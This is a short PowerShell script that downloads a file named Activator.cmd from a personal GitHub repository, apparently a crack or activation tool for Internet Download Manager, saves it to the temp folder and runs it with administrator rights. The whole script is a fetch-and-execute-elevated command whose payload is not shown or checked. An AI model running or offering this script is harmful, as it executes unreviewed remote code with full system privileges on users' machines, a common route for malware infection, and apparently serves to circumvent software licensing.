$url = "https://raw.githubusercontent.com/AfnanJamber/idm/refs/heads/main/Activator.cmd"
$tempCmdPath = "$env:TEMP\Activator.cmd"
Invoke-WebRequest -Uri $url -OutFile $tempCmdPath
Start-Process "cmd.exe" -ArgumentList "/c `"$tempCmdPath`"" -Verb RunAs
